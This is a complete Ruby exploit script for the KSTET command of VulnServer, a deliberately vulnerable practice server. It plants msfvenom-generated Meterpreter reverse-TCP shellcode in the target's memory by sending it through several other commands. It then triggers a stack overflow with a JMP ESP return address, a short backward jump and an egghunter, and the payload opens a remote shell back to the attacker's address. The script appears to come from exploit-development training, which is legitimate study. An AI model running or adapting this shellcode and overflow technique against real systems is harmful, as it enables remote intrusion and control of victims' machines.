#! /usr/bin/env ruby
# VulnServer.exe KSTET Exploit
# 
# Usage ./kstet.rb <IP> <PORT>
#
require 'socket'

# Check arguments
if ARGV.length < 2
  puts "usage #{__FILE__} <target ip> <target port>"
  exit
end

# Create the socket arguments from ARGV
IP = ARGV[0]
PORT = ARGV[1]

# Create our shellcode and egg
# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai 
# -b "\x00\x0a\x0d" -f ruby  LHOST=192.168.16.2 LPORT=1337
# Payload size: 360 bytes + 8byte EGG
shellcode = "WOOPWOOP" +
  "\xd9\xcc\xd9\x74\x24\xf4\xbb\x44\x88\x84\x9d\x5f\x31\xc9" +
  "\xb1\x54\x31\x5f\x18\x83\xc7\x04\x03\x5f\x50\x6a\x71\x61" +
  "\xb0\xe8\x7a\x9a\x40\x8d\xf3\x7f\x71\x8d\x60\x0b\x21\x3d" +
  "\xe2\x59\xcd\xb6\xa6\x49\x46\xba\x6e\x7d\xef\x71\x49\xb0" +
  "\xf0\x2a\xa9\xd3\x72\x31\xfe\x33\x4b\xfa\xf3\x32\x8c\xe7" +
  "\xfe\x67\x45\x63\xac\x97\xe2\x39\x6d\x13\xb8\xac\xf5\xc0" +
  "\x08\xce\xd4\x56\x03\x89\xf6\x59\xc0\xa1\xbe\x41\x05\x8f" +
  "\x09\xf9\xfd\x7b\x88\x2b\xcc\x84\x27\x12\xe1\x76\x39\x52" +
  "\xc5\x68\x4c\xaa\x36\x14\x57\x69\x45\xc2\xd2\x6a\xed\x81" +
  "\x45\x57\x0c\x45\x13\x1c\x02\x22\x57\x7a\x06\xb5\xb4\xf0" +
  "\x32\x3e\x3b\xd7\xb3\x04\x18\xf3\x98\xdf\x01\xa2\x44\xb1" +
  "\x3e\xb4\x27\x6e\x9b\xbe\xc5\x7b\x96\x9c\x81\x48\x9b\x1e" +
  "\x51\xc7\xac\x6d\x63\x48\x07\xfa\xcf\x01\x81\xfd\x30\x38" +
  "\x75\x91\xcf\xc3\x86\xbb\x0b\x97\xd6\xd3\xba\x98\xbc\x23" +
  "\x43\x4d\x28\x21\xd3\xae\x05\x39\x21\x47\x54\x3a\x20\xae" +
  "\xd1\xdc\x7a\x80\xb1\x70\x3a\x70\x72\x21\xd2\x9a\x7d\x1e" +
  "\xc2\xa4\x57\x37\x68\x4b\x0e\x6f\x04\xf2\x0b\xfb\xb5\xfb" +
  "\x81\x81\xf5\x70\x20\x75\xbb\x70\x41\x65\xab\xe0\xa9\x75" +
  "\x2b\x89\xa9\x1f\x2f\x1b\xfd\xb7\x2d\x7a\xc9\x17\xce\xa9" +
  "\x49\x5f\x30\x2c\x78\x2b\x06\xba\xc4\x43\x66\x2a\xc5\x93" +
  "\x30\x20\xc5\xfb\xe4\x10\x96\x1e\xeb\x8c\x8a\xb2\x79\x2f" +
  "\xfb\x67\x2a\x47\x01\x51\x1c\xc8\xfa\xb4\x1f\x0f\x04\x4a" +
  "\x3d\xa8\x6d\xb4\x01\x48\x6e\xde\x81\x18\x06\x15\xae\x97" +
  "\xe6\xd6\x65\xf0\x6e\x5c\xeb\xb2\x0f\x61\x26\x12\x8e\x62" +
  "\xc4\x8f\xc7\xec\x2b\x30\xe8\x0e\x10\xe6\xd1\x64\x51\x3a" +
  "\x66\x76\xe8\x1f\xcf\x1d\x12\x33\x0f\x34"

# Fill memory space with our shellcode 
# Exclude STATS, RTIME, LTIME, SRUN, TRUN  which truncates the shellcode!)
pre_cmds = [ 
  "HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN" 
]

# For each pre-cmd send our shellcode and hope it stays in memory
pre_cmds.each do |cmd|
  puts "[+] Creating connection for: #{cmd}"
  s = TCPSocket.new(IP, PORT)
  s.gets
  buffer = cmd + " " + shellcode
  puts "[+] Sending shellcode to memory using: #{cmd}"
  s.puts(buffer)
  s.close
end

puts "[+] Creating exploit trigger using KSTET command... "

# Define command for exploit
cmd = "KSTET"

# Define payload
ret = "\xaf\x11\x50\x62"      # 625011AF FFE4 JMP ESP
stage1 = "\xeb\xbe\x90\x90"   # JMP SHORT -0x40
stage2 =                      # egghunter WOOP WOOP
  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05" +
  "\x5a\x74\xef\xb8\x57\x4f\x4f\x50\x89\xd7\xaf\x75\xea\xaf" +
  "\x75\xe7\xff\xe7"

payload = " " + "\x90" * 10 + stage2 + "\x90" * 28  + ret + stage1

# Create a socket for the exploit
s = TCPSocket.new(IP, PORT) 

# Send the payload
begin
  s.gets
  puts "[+] Sending final payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

